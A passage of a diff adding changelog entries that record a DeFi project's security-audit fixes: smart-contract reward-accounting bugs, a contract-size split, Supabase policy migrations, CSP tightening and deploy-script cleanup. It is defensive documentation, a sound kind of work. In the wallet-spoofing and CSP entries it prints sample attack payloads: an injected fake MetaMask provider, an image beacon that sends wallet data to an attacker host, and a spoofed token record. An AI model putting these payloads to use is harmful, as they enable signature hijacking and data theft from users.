+**Two findings were deferred and then closed the same day.** `f703e2b1` filed L-14 and
+L-15 as needing a dedicated PR because the transfer path's recipient changes mid-call;
+`09730024` landed both hours later, advancing `rewardDebt` by only the credited amount
+on transfer (mirroring `kick` line 530) and reordering the shortfall events to match
+accrual order. `1e733fdb` added the L-18 execute-time `code.length` recheck to
+`applyRestakingContract` — ~2k gas, defending an EIP-7702 delegation revoked inside the
+48h window rather than a SELFDESTRUCT that EIP-6780 already closed.
+
+The running totals moved twice: `0dbdaa68` recorded 1/1 C, 32/35 H, 21/39 M and ~30 L
+closed; the Round 2 doc `c09321de` revised that to **1/1 C, 34/35 H, 22/39 M, ~33 L**,
+with H-38 (CI `continue-on-error` debt), M-16 + L-29 (owner-trust), L-10 (CREATE2 defer)
+and L-42 + L-43 (frontend responsibility) codified as the final deferred list.
+
+**The HIGH denominators do not reconcile, and that is left standing rather than
+smoothed.** The report header counts 23 HIGH; both resolution docs measure closures
+against 35, and the finding IDs run as far as H-38. The MEDIUM denominator (39) matches
+the header exactly. Every figure above is the one its own commit records.
+
+### Security — The swarm's off-chain half: a spoofable wallet selector, `img-src https:`, a case-permutation like counter, and a verifier that went green on a dead referral program (2026-05-26)
+
+- **H-31 — `isMetaMask` was the whole wallet-selection logic on Nakamigos** (`8c0a34eb`).
+  Any browser extension injecting
+  `window.ethereum.providers = [{isMetaMask:true, request:attackerHandler}]` wins the
+  race and **hijacks every SIWE signature and Seaport order signature on that surface**.
+  The main app had been on EIP-6963 via RainbowKit/wagmi; Nakamigos now dispatches
+  `eip6963:requestProvider`, selects by `rdns` against an explicit allowlist
+  (io.metamask, com.coinbase.wallet, app.phantom, io.rabby, me.rainbow, app.uniswap),
+  and falls back to the `_metamask` internal namespace before bare `window.ethereum`.
+  `isMetaMask` is not trusted anywhere in the selection path.
+- **H-32/H-33/H-34 — attacker-controlled metadata reached `<img>`, `fetch()` and the
+  token picker** (`3dd75d94`). NFT `image` / `banner_image` could carry `file://`,
+  `vbscript:` or a tracking pixel; both now go through the shared `resolveSafeUrl` in
+  `lib/imageSafety.ts` with the OpenSea-standard scheme allowlist, and the same gate
+  gained control of the `contractURI()` JSON fetch, which was an in-browser LAN-scan SSRF
+  vector. Separately, LiquidityTab rehydrated custom tokens from `localStorage` with no
+  validation, so a spoofed `{symbol:"USDC", address:"0xATTACKER", decimals:6}` would
+  surface in the picker and **the user would approve LP additions against the attacker's
+  contract**; it now mirrors `useSwap.ts`'s address/symbol/decimals checks, native-ETH
+  pseudo-address reject, default-list collision reject and dedup.
+- **H-36 — CSP `img-src 'self' data: blob: https:` is effectively `img-src *`**
+  (`172af568`). Paired with the above, an exfil sink of the form
+  `<img src="https://attacker.com/?wallet=0x…">` had nothing standing behind it. Replaced
+  with an explicit origin allowlist covering the CDNs actually in use — Alchemy NFT,
+  Cloudinary, `assets.mgxs.co`, CoinGecko, `raw.githubusercontent.com`, `i.seadn.io`,
+  six IPFS gateways, Arweave, S3, the GeckoTerminal chart host — keeping `data:` and
+  `blob:` for inline base64 SVG and on-chain token URIs.
+- **H-28/H-29 — Supabase migration 006** (`7ea0c8f3`). RLS denied `messages`
+  UPDATE/DELETE only *by absence of a policy*, a convention living in code comments; any
+  future migration adding an UPDATE policy without `WITH CHECK (false)` would have
+  flipped the table open, so explicit deny-policies were written. And `toggle_like`
+  checked `lower(wallet)` against the JWT but mutated the array with the **raw** argument
+  — a case-permutation attack could double-count likes and balloon the `likes` column
+  unbounded. Both check and write now normalise from the JWT claim; the migration ends
+  with a DO-block that asserts both deny policies landed so a partial apply fails loud.
+- **H-25 then H-24/H-27 — the indexer** (`17feede7`, `43e77e76`). `Withdrawn` /
+  `EarlyWithdrawn` zeroed only `amount` on conflict, leaving `lockDuration`, `lockEnd`
+  and `boostBps` stale, so **drained positions still read as active** to any frontend
+  filtering on `lockEnd > now` or computing voting power from `boostBps`. `17feede7`
+  explicitly deferred H-24 and H-27 as outside the minimal-surface envelope, leaving a
+  NatSpec breadcrumb recommending the frontend fall back to on-chain `ownerOf()`;
+  `43e77e76` closed both a few hours later — a canonical ERC-721 `Transfer` fragment
+  added by hand to the inline ABI in `ponder.config.ts` (Solady emits it verbatim per
+  EIP-721, Ponder just does not surface it), so positions stop being misattributed to
+  the original minter forever after a secondary trade; plus a per-process `Map` cache in
+  front of `isPairAllowed` that memoises negative verdicts too, because spamming N junk
+  pairs and one `Swap` each cost 2N RPC calls and N DB hits per block.
+- **H-12..H-19 — the deploy and verify scripts were signing off on incomplete state**
+  (`87b47da5`). `VerifyMVP` went green while the deployer EOA still controlled the
+  factory, because accepting the 48h timelocked rotations is a manual runbook step; INV-11
+  now asserts `feeToSetter`/`feeTo`/`guardian` equal multisig/revDist/pauseGuardian.
+  Worse, it went green on a **dead referral program**: without
+  `ReferralSplitter.setupComplete()` and `approvedCallers(swapFeeRouter)`, `recordFee`
+  falls into a try/catch that silently redirects the referral share to treasury, and
+  post-`completeSetup` that state is frozen permanently. INV-12 also catches a stale
+  `Ownable2Step` pendingOwner slot that would let a captured deployer hijack the rotation
+  inside its 14-day window. On the deploy side, `setSequencerFeed` — a one-shot — was
+  being silently skipped on L2 and is now wired before `transferOwnership`, and two loud
+  reminders were added for the multisig acceptance ceremonies and the TWAP bootstrap
+  sequence (4 × `update()` at ≥15min, then a 60min cooldown before the first
+  `POL.accumulate`, which would otherwise revert). Two ghost scripts were deleted:
+  `DeployTegridyRouter.s.sol`, which the commit records as carrying a hardcoded factory
+  address, and `DeployTokenURIReader.s.sol`, which went for the simpler reason that
+  `DeployMVP` already covers the uriReader.
+
+### Fixed — Five regressions introduced by the audit wave itself, one of which would have stranded user residue permanently (2026-05-26)
+
+Five self-audit agents were run back over the day's own 25 fix commits. They found two
+real regressions and three smaller ones — **the fix wave was the thing that needed
+auditing**, and this entry exists because that is worth keeping rather than quietly
+correcting.
+
+- **H-11 reverted outright.** The `ownerOf(tokenId) != msg.sender` check added to
+  `claimUnsettledForTokenId` broke the documented C-1 *post-transfer* pull pattern:
+  `TegridyRestaking.unrestake` / `emergencyWithdrawNFT` / `emergencyForceReturn` pull
+  per-tokenId residue **after** handing the NFT back, at which point `ownerOf` is the
+  user and not the restaking contract that credited the residue. The check reverted
+  inside a try/catch that swallowed it, stranding the residue permanently in both
+  `unsettledRewardsByTokenId[tokenId]` and `unsettledRewards[restakingContract]`. The
+  threat H-11 was written against is bounded by `min(perTokenId, sender's bucket, pool)`
+  — a captured lending escrow can only drain up to its own bucket, which is what the
+  existing `_isTrackedHolder` gate already permits. **Unbounded permanent loss to fix a
+  bounded attribution issue is a bad trade**, so the check is gone; the `NotEscrowedHere`
+  error declaration is kept as the anchor for a real per-tokenId attribution fix.
+- **H-29's `toggle_like` would have broken likes for every user.** Migration 006 declared
+  `RETURNS void`, but the caller at `nakamigos/lib/supabase.js:251-262` does
+  `.rpc(...).single()` then `rowToMsg(data)` and expects the updated row. Restored to
+  `RETURNS messages`, case-normalisation preserved.
+- **H-33's symbol regex was too strict to survive its own default list.**
+  `/^[A-Z0-9]{1,12}$/` rejects `stETH`, `wstETH`, `rETH`, `cbETH` — and `DEFAULT_TOKENS`
+  contains `stETH`, so the rehydrate would have dropped the canonical Lido symbol on
+  every page load. Relaxed to allow mixed case; the collision check still uppercases, so
+  case-permutation spoofs remain caught.
+- **H-02 double-emitted `ConversionTWAPFloor`**, once from `_enforceTWAPMinETHOut` and
+  once at the callsite, double-counting in indexers. The callsite emit is now gated to
+  the no-direct-pair branch, on both conversion functions.
+- **M-06 gained a symmetric recheck.** `executeRescueNFT` now re-tests
+  `_residualClaimant != address(0)`, mirroring the propose-time guard. The commit is
+  explicit that the window is currently unreachable — residue requires an active restake
+  and rescue requires none — so this is defence-in-depth against a future state path,
+  not a live hole.
+
+### Internal — Tests realigned to the day's tightenings, the multisig-migration script built, and two ops runbooks written (2026-05-26)
+
+The mechanical half of the same day. Recorded because the suite counts elsewhere in this
+file are only meaningful if what moved them is written down.
+
+- **Stale tests across three commits, all the same shape: a contract was tightened and
+  its tests were not.** `0e5bd6e5` — L-26 removed the "rotate guardian to zero, then
+  recover via `setGuardian`" path, which was the *setup* phase of
+  `test_NEWA2_setGuardian_recoveryPath`; rather than delete the coverage, the setup now
+  reaches the state by `vm.store` on slot 4 (read from `forge inspect` storage layout),
+  with a comment saying plainly that `setGuardian` is no longer reachable except in
+  tests, plus a new canary asserting `proposeGuardianChange(address(0))` reverts
+  `ZERO_GUARDIAN`. `4c42e93f` — `test_SFRM01_multiHop_allowedForOwner` passed
+  `MIN_MULTIHOP_ETH_OUT_WEI` as `minOut`, but H-02's TWAP floor lands at ≈4.9e16 with
+  that fixture's 1:1000 reserves, so it was bumped to 5e16 **with the arithmetic written
+  into the comment** so a maintainer can re-derive the bound from `BASELINE_TOWELI` /
+  `BASELINE_WETH`; four `sweepStuckRewards` tests were rewritten to walk M-09's new
+  propose → `skip(SWEEP_STUCK_TIMELOCK+1)` → execute path; and one `expectRevert` was
+  retargeted for L-08's `Unauthorized` → `AdminAlreadySet` swap. That commit closed at
+  1,499/1,499 across the full suite. `2a217c4e` — the referral suite switched an EOA to
+  `MockApprovedCaller` for L-28 and warped 8 days for L-52, **and added a canary for each
+  tightening in both directions**: that grants to an EOA now revert, that revokes still
+  work for any address, that forfeit reverts during the grace window and succeeds after.
+  92/92 in `Audit195_Referral`.
+- **`TransferOwnershipToMultisig.s.sol` built to the spec in
+  `docs/MULTISIG_MIGRATION.md` § 5** (`f2d7a45c`), driving the deployer-EOA → Safe handoff
+  in one broadcast. Pre-flight asserts `MULTISIG != 0`, `MULTISIG.code.length > 0` —
+  **which is the guard against pasting a hardware-wallet address** — and `owner() ==
+  sender` on every ownable plus `feeToSetter() == sender` on the factory. The inventory
+  comes from `vm.envOr` with `address(0)` entries skipped, so the same script serves an
+  MVP-only deploy and the full 22-contract set. TegridyFactory is handled separately
+  through `proposeFeeToSetter` (its auth model is not Ownable2Step); TegridyFeeHook is
+  explicitly out of scope because its owner is the Arachnid CREATE2 proxy and it needs a
+  constructor patch and redeploy first. Nine tests cover the happy path, both MULTISIG
+  validations, owner-mismatch and factory-setter-mismatch aborts, partial inventory,
+  optional factory, idempotent replay and array length mismatch — driven through a
+  parameterised `runForTest` entrypoint so no env-var state leaks between them. Full
+  suite 1,499/1,499 again here. The doc section was updated from "(does not exist yet;
+  this section is the spec)".
+- **Two runbooks that did not exist** (`fe671224`), flagged in `NEXT_SESSION.md` as
+  launch-readiness gaps separate from the code.
+  [`docs/INCIDENT_RESPONSE.md`](docs/INCIDENT_RESPONSE.md): SEV-0..3 tiers with examples
+  drawn from this protocol's own surface, IC/Comms/Scribe/Researcher roles, and a pause
+  toolkit that distinguishes the five contracts with a PauseGuardian fast-path
+  (TegridyStaking, TegridyRestaking, SwapFeeRouter, RevenueDistributor, POLAccumulator)
+  from the multisig-only ones, plus a first-15-minutes script, comms templates and a list
+  of sharp edges specific here — permissionless `distributeFeesToStakers`, the 7-day TWAP
+  reset timelock, `emergencyWithdraw` forfeiting accrued rewards.
+  [`docs/MULTISIG_MIGRATION.md`](docs/MULTISIG_MIGRATION.md): 3-of-5 threshold guidance,
+  signer spread across identity/geography/hardware, a pre-migration inventory of 22
+  owner-controlled contracts, the EIP-170 admin-sister-contract path requiring a 7-day
+  `proposeAdminReplacement` first, and eight failure-mode playbooks including signer
+  hardware brick, deployer compromise mid-migration and an expired 14-day window.
+
+### Fixed — A permissionless dust reclaim swept the entire unclaimed remainder of an epoch, and active stakers have no claim deadline (2026-05-25)
+
+A line-by-line audit of all 23 `mvp-launch` contracts found **one unprivileged,
+common-case, permanent-loss bug**, and then a second pass found the first fix incomplete.
+Both are recorded here, because the second half is the interesting one.
+
+**The bug** (`e7e05577`): `RevenueDistributor.autoReconcileDust()` is permissionless, and
+it set `epochClaimed[i] = epoch.totalETH` at the 14-day mark — sweeping each epoch's
+whole unclaimed remainder to treasury. But active stakers (auto-MaxLock, restaked) have
+**no claim deadline at all**, so any monthly or quarterly claimer permanently lost every
+epoch a third party had reconciled. The full suite did not catch it because the tests
+asserted the intended dust-reclaim path and never the adversarial interaction with an
+active staker. The fix reclaims only past the 44-day extended cutoff
+(`DUST_RECLAIM_GRACE + 30d`) and *bumps* `epochClaimed` by the reclaimed slice instead of
+zeroing the epoch; `proposeClaimRecovery` was decoupled from the cursor and now gates on
+whether the pool is actually empty, so a passed cursor no longer bricks
+checkpoint-corruption recovery. Shipped alongside: the `_isTrackedHolder` guard added to
+`claimUnsettled()` that its sibling `claimUnsettledFor()` already had; the live reward-pool
+cap applied to `StakingViewLib.earned()`, which had been over-reporting claimable under
+an under-funded pool; and a typed revert replacing a checked-math Panic on the L2
+stale-feed sentinel in POLAccumulator (×3) and SwapFeeRouter.
+
+**The correction** (`f4331296`): a second deep pass with seven cross-cutting agents found
+no new unprivileged-theft bug but established that the fix above was **a strict
+improvement, not a complete one — it moved the active-staker loss and the recovery brick
+from 14 days to 44**. `autoReconcileDust` now reclaims only past
+`AUTO_RECLAIM_ABANDONED_AGE` (180d), far beyond the 44-day owner-forfeit cutoff, so a
+semi-annual claimer keeps headroom and a late-discovered checkpoint-corruption victim
+still finds a funded epoch. The owner-forfeit path still cleans the 44d→180d window, and
+because that path carries a 1% lifetime cap, epochs in it are never fully drained and
+recovery keeps working on them. Same commit moved the `claimedAtEpoch` seal inside the
+`share > 0` block, so **a zero-payout claim no longer seals the victim out of recovery**
+via `AlreadyClaimedNormally`; `lastClaimedEpoch` still prevents re-traversal, so no
+double-credit is introduced. POLAccumulator's `accumulate()` cooldown moved before the
+external swap (CEI parity with SwapFeeRouter), and `executeClearResidualClaimant` gained
+a 7-day validity window so an abandoned proposal from a since-rotated owner key cannot be
+executed at an arbitrary later time. Tests realigned from 44d to 180d; 1,487 passing, 0
+failing.
+
+Two consistency items closed the day (`17406ffb`): TegridyTWAP's bespoke `TWAPAdmin` — a
+minimal Ownable2Step **lacking the 14-day pending-transfer expiry, `cancelOwnershipTransfer`
+and the EIP-7702/contract-only reject that every other admin contract has** — was deleted
+in favour of the shared `OwnableNoRenounce` base, ABI preserved; and the restaking
+`_bonusRewardToken` non-hook deploy invariant was documented at construction, with
+on-chain ERC-777 detection deliberately *not* added because best-effort probing is
+bypassable and adds surface to a deployer-controlled immutable.
+
+One finding was closed with documentation rather than code (`120d0fa7`). The TWAP
+bridging-term MEDIUM has no live exploit surface: the only in-tree `consult()` consumer is
+POLAccumulator, which already gates every read with a 50bps `_assertSpotNearTWAP`, and the
+bridge term is the R014 stale-pair-freshness fix — removing it regresses freshness, and
+tweaking `MAX_BRIDGING_GAP` does not address the per-observation case. **The defence is
+consumer-side, so it was written into `consult()`'s NatSpec as a requirement**: any future
+consumer must reject sub-floor pairs and apply a spot-vs-TWAP deviation gate.
+
+A third item was reported and deliberately **not** implemented: recovery-seniority
+clawback from the forfeit pool. After the 180d horizon and the 1% cap, the commit's
+position is that the residual is an extreme early-protocol edge that is off-chain
+backfillable, and the change would be high-risk accounting surgery on the most delicate
+contract in the set. Recommended against, in writing.
+
+### Security — Vercel previews inherit production secrets but not `NODE_ENV`, so the origin gate and the rate limiter were open on every preview URL (2026-05-25)
+
+F1, and it is a one-line environment assumption. `aggregator-proxy` and `ratelimit` both
+branched on `NODE_ENV !== "production"`. **A Vercel preview deployment inherits the
+production secrets but not `NODE_ENV=production`**, so on every preview URL the origin
+gate was wide open and the rate limiter failed *open* — an open proxy carrying live
+credentials, reachable at a guessable hostname. Both now fail closed on prod-like
+(`NODE_ENV=production` **or** `VERCEL_ENV` in {preview, production}), matching the idiom
+`supabase-proxy.js` already used.
+
+Two more in the same commit: `orderbook` now requires `seaport_order_hash` on create —
+the fill verifier already rejects every NULL-hash row since the maker-spoof legacy
+fallback was removed, so a NULL-hash create only produced a dead, unfillable listing, and
+the frontend already always sends it; the stale fill test was refreshed to assert the
+secure reject rather than the old behaviour. And the `opensea` handler took the same
+`readBoundedText` + `logSafe` treatment as the aggregator proxy. vitest api suite 198/198.
+
+`cc382889` refreshed [`contracts/AUDITOR_HANDOFF.md`](contracts/AUDITOR_HANDOFF.md) for
+the outside firms: snapshot ref moved `d01a2ae` → `3285f40` (25 commits in between), a
+new §0a groups the fixes since the snapshot by audit ID, and **the advertised test count
+was corrected from `2614/2614` to `1487/1487`** — not a regression, but the honest
+consequence of the 15-of-30 MVP cut, which excised the Wave-2 contracts and their tests.
+Verified by running it: 81 suites, 1,487 passing, 0 failing.
+
+### Fixed — TegridyStaking was 4,607 bytes over the mainnet limit and no compiler flag could close the gap (2026-05-24)
+
+The launch blocker. `TegridyStaking` measured **29,183 B against EIP-170's 24,576 B — over
+at `runs=200` *and* at `runs=1`**, so a contract split was mandatory. Three size
+increments and a scope reduction, all landed on one day, took it to **24,505 B, with 71
+bytes of headroom** at the canonical `runs=200`.
+
+- **Increment 1** (`1fe4f0dc`) moved the `Position` struct to file level in
+  `src/lib/StakingViewLib.sol` (the `positions` public-getter ABI is unchanged) and the
+  read-only `votingPowerOf` / `aggregateActiveBoostBps` / `earned` into a delegatecall
+  library. 29,183 → 28,795 (−388 B); the library deploys separately at 858 B. The commit
+  states the negative result plainly: **per-function view extraction is low-yield**,
+  because the delegatecall stub overhead offsets small read-only bodies, and the
+  remaining ~4.2 KB has to come from stateful clusters — which forces storage-struct
+  grouping, since scalar storage cannot be written from a library without a struct ref.
+- **Increment 2 deleted rather than moved** (`3524f6b7`). The extend-lock fee and
+  penalty-recycle systems all default to 0 bps and are off at launch, so removing them is
+  **behaviour-identical to the launch configuration**: `extendLock` charges no fee, and
+  the early-withdrawal penalty already went entirely to treasury when the recycle bps was
+  zero. Out went the three bps fields and their ceiling, `_chargeExtendFee` /
+  `_splitExtendFee` / `_splitPenalty` / `_creditRewardPool`, three admin appliers, the
+  events and errors, the matching propose/execute/cancel in `TegridyStakingAdmin`, and
+  test file R029. 28,795 → 27,594 (−1,201), still 3,018 over. A side effect worth noting:
+  this physically removes the `_chargeExtendFee` debt-advance code a prior over-credit
+  bank-run vector had lived in.
+- **Scope reduction** (`d722aaf4`): TegridyRestaking left the MVP deploy for Phase 7 — it
+  ships paused and nothing in the MVP needs it deployed, since
+  `staking.restakingContract`, `revDist.restaking` and `referral.restakingContract` are
+  all wired post-deploy through timelocks and tolerate being unset. **That incidentally
+  resolved H2**: `DeployMVP` had been queuing `proposeRestakingContract` /
+  `proposeRestakingChange` as the deployer, and the M19-PORT `acceptOwnership` override
+  merged in earlier the same day (see the merge entry below) flushes exactly those on
+  handoff — so restaking would have been silently left unwired. Nothing is queued now, so
+  there is nothing to flush.
+- **Increment 3, the real one** (`7d6a8f85`), moved the live reward-accounting cluster
+  into a new delegatecall-linked `src/lib/StakingRewardLib.sol`: `_accumulateRewards`,
+  `_getReward`, the `kick` settle body, `_settleRewardsOnTransfer`, `_settleUnsettled`,
+  the `claimUnsettled*` family, and `_afterTokenTransfer` — the last being the single
+  largest win, because it needs no reward-scalar marshalling. The mutable reward scalars
+  cross the boundary as a `RewardState` struct through **one `_loadRewardState` /
+  `_storeRewardState` choke-point, precisely so a dropped write-back cannot happen
+  silently**. The final 52 bytes came from demoting the vestigial `strandedJbacAtVault*`
+  getters `public → internal`, verified to have zero off-chain readers repo-wide with the
+  data event-mirrored anyway. Full suite at that point: 1,487/1,487, including every
+  invariant and M16 bounce-transfer test.
+
+The extraction was gated by a safety net committed first (`40d20b62`, green at 1,435/0):
+15 exact-or-±1-wei tests pinning the current behaviour of every function about to move,
+covering accrual (closed-form `earned`, two-staker pro-rata, cross-window linearity), the
+funded and under-funded `getReward` paths, `kick` under both, transfer-settle, and the
+`claimUnsettled` guards — **plus the load-bearing conservation checks: the wei-level value
+identity `balance == totalStaked + totalRewardsFunded − rewardsPaidOut − drained`,
+`totalUnsettled == Σ per-user`, and end-to-end principal recovery at every checkpoint,
+which is exactly what a dropped-write-back or double-credit bug would break.** With C1_L1
+that is the 17-test net the extraction commit names as its gate.
+
+**Two stale comments were corrected on the way out, and the correction is the point.**
+`foundry.toml` said `runs=200` is safe — false; the lever was always the split, and
+`runs=1` bought only ~1.2 KB. That comment had been written two days earlier as part of
+the Phase 0 cut, on the theory that deleting half the contracts would leave the rest with
+headroom. And `contracts-ci.yml`'s EXCEPTIONS list recategorised TegridyStaking from
+"Phase-0-split pending" to a floor-only warning. TegridyRestaking stayed over EIP-170 at
+29,467 B, CI-allowlisted, deferred to Phase 7 with its own split.
+
+### Fixed — A cursor write that rolled back on revert, a dust function that could forfeit live claims, and dead slippage state three comments called load-bearing (2026-05-24)
+
+Seven correctness fixes across the same day, several of them resolved by deletion.
+
+- **The cursor could never advance past a run of empty epochs** (`aedf9806`, H1/HIGH).
+  `claim()` / `claimUpTo()` wrote `lastClaimedEpoch` and then reverted **in the same
+  branch**, so the revert rolled the write back with it. A staker with more than
+  `MAX_CLAIM_EPOCHS` leading zero-power or already-settled epochs could therefore never
+  get past them and **permanently lost all claimable revenue behind the blockage**. Now
+  the cursor commits and the call returns. No new hole: recovery keys off
+  `claimedAtEpoch`, not the cursor, so `proposeClaimRecovery` still works. Same commit,
+  M1: a banned referrer holding stake ≥ `MIN_REFERRAL_STAKE_POWER` had a balance that was
+  neither claimable (banned), forfeitable (stake gate) nor sweepable — frozen forever;
+  `forfeitUnclaimedRewards` now exempts banned referrers from the stake gate and routes
+  to treasury, which is what the ban NatSpec had promised all along. 1,471/1,471.
+- **`reconcileRoundingDust` deleted, because no gate could make it safe** (`f28624af`,
+  M2). It forced `totalEarmarked == totalClaimed` whenever the outstanding obligation was
+  ≤ 1 ETH — with no per-epoch eligibility, no grace period and no `epochClaimed` bump.
+  But that gap **always includes the current live epoch's still-claimable shares**, so one
+  owner call could move real user revenue into `totalForfeited`, and a later `sweepDust()`
+  would drain it to treasury, stranding those users at claim time. Dust is already handled
+  safely by `autoReconcileDust()` (per-epoch, past the grace, halts on pending recoveries,
+  bumps `epochClaimed`) and `sweepDust()`; the only loss is cleanup of sub-0.01-ETH
+  rounding residue. **One of the three deleted tests had been asserting the
+  forfeit-of-live-shares as correct behaviour.** Suite 1,457/0.
+- **`backstopBps` / `maxSlippageBps` were write-only state, and three comments said
+  otherwise** (`433bb0eb`, L7). Both were read *only* inside their own setters, to emit
+  the old value — never in `accumulate`, `executeHarvestLP`, `_twapMinOut`,
+  `_twapHarvestMinOut` or `_assertSpotNearTWAP` — while three comments claimed they still
+  applied as a "belt-and-braces floor". Removed: the state, the propose/execute/cancel
+  setters, the view getters, two timelock keys and their delays, the events and errors,
+  and the two `acceptOwnership` cancel-on-handoff blocks. The comments were corrected to
+  say plainly that slippage protection comes solely from the TWAP-derived floors
+  (`TWAP_SAFETY_BPS`) and the spot-vs-TWAP deviation gate. **38 tests went with it,
+  because they exercised only the deleted setters** — POLAccumulator lands at 17,712 B
+  with full coverage of its live paths, suite 1,419/0, zero dangling references.
+- **A forced TWAP bypass poisoned its own deviation baseline** (`d4e08a2c`, L5). On L2,
+  when `update()` force-bypasses an observation because of a sequencer outage or a
+  bridging-gap trip — a permissionless path — it then overwrote `lastSpot0`/`lastSpot1`
+  with the current spot, which during an outage derives from frozen reserves. An attacker
+  first in the queue post-resume could push spot, land a force-bypassed observation that
+  pins the manipulated value as the baseline, and **every honest `update()` afterwards
+  trips the deviation gate against it, bricking `consult()` until the 1-day dormancy
+  bypass or a 24h admin reset heals it**. Bounded, self-healing and with no value
+  extraction — but a real liveness DoS on the oracle POL depends on for its slippage
+  floor. A `forcedBypass` flag, set only in that branch, now gates the `lastSpot` writes
+  so the last honest baseline survives; bootstrap and owner-deviation bypasses set
+  `bypassed` earlier and still refresh as before. Mainnet is unaffected. The commit files
+  its own follow-up: the L2-outage-then-resume regression test does not exist yet.
+- **`_getReward` did not mirror its siblings' per-tokenId shortfall write** (`ea7ffe6a`,
+  L1). Under an under-funded pool with a *tracked* recipient (the restaking contract or a
+  whitelisted lending escrow), it booked the shortfall to `unsettledRewards[recipient]`
+  but — unlike `kick()` and `_settleRewardsOnTransfer` — not per-tokenId, stranding the
+  slice permanently: `claimUnsettledFor` reverts for tracked holders and
+  `claimUnsettledForTokenId` read a zero mapping. Latent today with restaking deferred to
+  Phase 7, fixed before it can ship. The regression test **isolates the `_getReward` path**
+  by asserting per-tokenId is 0 after the inbound transfer and after a clean baseline
+  claim, so the asserted credit can only have come from the under-funded call; it
+  reconciles paid + booked against pending, recovers the slice, and carries an EOA control
+  proving the fix is tracked-holder-scoped. Mutation-checked: it fails if the fix is
+  reverted.
+- **A bricked sweep, and a role the deployer kept.** `POLAccumulator.executeSweepETH`
+  used a raw `recipient.call{value}("")`, diverging from `executeHarvestLP` — if treasury
+  were rotated to a contract whose `receive()` reverts, **the sweep was bricked until
+  another 48h treasury rotation**; it now routes through
+  `WETHFallbackLib.safeTransferETHOrWrap` like its sibling (`d4e71645`, L6). Separately,
+  `DeployMVP` created TegridyFactory with `guardian = deployer EOA` and never rotated it,
+  so the deployer silently retained emergency pair-disable power — a rate-limited AMM DoS
+  surface, and outside the documented "multisig/guardian holds all roles" bound;
+  `_wirePauseGuardian` now queues the rotation at deploy time for the multisig to execute
+  after accepting `feeToSetter`, added as runbook step 3b (`17293d01`, M6). The EOA still
+  holds the role until execution, but **it can no longer be left holding it unnoticed**.
+
+### Changed — Indexer cut to the MVP set and its pair feed allowlisted, five broken deploy scripts replaced, and `main` merged back in (2026-05-24)
+
+- **The indexer was subscribed to contracts that are not being deployed** (`1a702df6`,
+  M3/M4/M5). Subscriptions, inline ABIs, handlers and schema tables were deleted for
+  TegridyRestaking (deferred to Phase 7), VoteIncentives, LPFarming, TegridyLending,
+  CommunityGrants, MemeBountyBoard, GaugeController, PremiumAccess and TegridyNFTLending,
+  leaving exactly the MVP set — **a net −1,930 lines across `ponder.config.ts`,
+  `ponder.schema.ts` and `src/index.ts`**. More importantly, `TegridyPair` is
+  auto-discovered through the factory's `PairCreated`, so *every* pair the factory ever
+  creates was being indexed and **anyone able to create a junk pair could poison Swap /
+  Mint / Burn data**. A cached `indexedPair` allowlist now resolves `token0()`/`token1()`
+  over RPC on the first event per pair and records whether either is TOWELI or WETH;
+  subsequent events read the cached verdict, **an RPC revert fails closed**, and all three
+  handlers early-return for anything not allowlisted. The GraphQL endpoint was re-mounted
+  with query depth 100 → 12 and aliases 30 → 20 to blunt nesting-amplified DoS, with an
+  explicit operator note that Ponder has no built-in auth or rate limiting and the
+  endpoint must never be exposed directly. Verification is honest about its own limits:
+  the commit records that there is **no test net in this codebase**, so the gate is
+  `ponder codegen` exiting 0 (which catches any orphaned reference left by the prune)
+  plus a `tsc --noEmit --skipLibCheck` showing only the **pre-existing** TS4023
+  `onchainTable` declaration-emit quirk — which hits all 13 tables identically, kept and
+  new alike, and is therefore not attributable to this change.
+- **Four of the five deploy scripts pointed at Solidity files that do not exist**
+  (`1edd9f0e`, M8): `deploy.sh` → `DeployAuditFixes.s.sol`, `deploy-v2.sh` →
+  `DeployV2.s.sol`, `deploy-lending.sh` → `DeployLending.s.sol`, `deploy-vote-incentives.sh`
+  → `DeployVoteIncentives.s.sol`. The fifth, `verify.sh`, was worse than broken: it
+  carried hardcoded pre-relaunch addresses and hand-verified TegridyStaking **without the
+  `--libraries` flags the now-delegatecall-linked contract requires**, so it would verify
+  the wrong contracts or fail outright. All five deleted (773 lines out) for one
+  182-line `contracts/deploy-mvp.sh` wrapping the canonical `DeployMVP` / `VerifyMVP`
+  scripts: keystore-first signing (`--account` over `--private-key`), **no hardcoded
+  addresses** (the operator exports TREASURY / MULTISIG / PAUSE_GUARDIAN, which DeployMVP
+  enforces disjoint), and `forge script --broadcast --verify` so `StakingViewLib` and
+  `StakingRewardLib` are auto-linked from the broadcast JSON — the thing the old
+  hand-rolled verify could not do. Subcommands: simulate / broadcast / verify / check,
+  with a `/dev/tty` confirmation on broadcast.
+- **`origin/main` merged into `mvp-launch`** (`28764f07`), bringing the M19-PORT
+  `acceptOwnership`-flush cluster and the Contracts CI regex→glob un-rot:
+  [#60](https://github.com/fomotsar-commits/tegridy-farms/pull/60) (flush ported to 14
+  timelock contracts), [#64](https://github.com/fomotsar-commits/tegridy-farms/pull/64)
+  (3 inline-timelock contracts),
+  [#65](https://github.com/fomotsar-commits/tegridy-farms/pull/65) (TegridyFeeHook
+  regression), [#66](https://github.com/fomotsar-commits/tegridy-farms/pull/66) (R064
+  hardcoded `isPool` storage slot 11 → 12) and
+  [#69](https://github.com/fomotsar-commits/tegridy-farms/pull/69) (README). Ten files
+  conflicted, nine of them deferred contracts plus `R064_PaginationBounds.t.sol`.
+  Non-destructive merge; the branch's own Phase 0 and Phase 1.3 history is preserved.
+  **This is the merge whose `acceptOwnership` flush would have silently unwired restaking
+  at deploy** — see the H2 note in the EIP-170 entry.
+
+### Added — The audit-handoff assurance package, and then the three analysers it shipped, none of which ran as delivered (2026-05-22 → 2026-05-24)
+
+**The package** (`13bda9ca`, `798b7a48`). A staking invariant runner at 256 runs × 500
+calls — 128k random action sequences per property — over stake / increaseAmount /
+withdraw / fastForward, pinning `balance(staking) >= totalStaked` (the load-bearing
+safety property for any constant-rate Synthetix-pattern pool: if it fails, `withdraw`
+cannot return principal), the global cap and an overflow sanity bound. Then a
+cross-contract runner at the same scale spanning TegridyStaking + TegridyRestaking, whose
+headline invariant `INV-PERTOKEN-LE-HOLDER` is **the canonical catcher for the C-1
+"first-claimer-drains-others" bug** — it asserts `unsettledRewardsByTokenId[tokenId] <=
+unsettledRewards[restakingContract]` for every tokenId restaking holds, with the handler
+wiring restaking through the admin's propose/execute timelock the way a real deployment
+would. Plus Slither, Halmos and Echidna configs for the auditors, and two additive
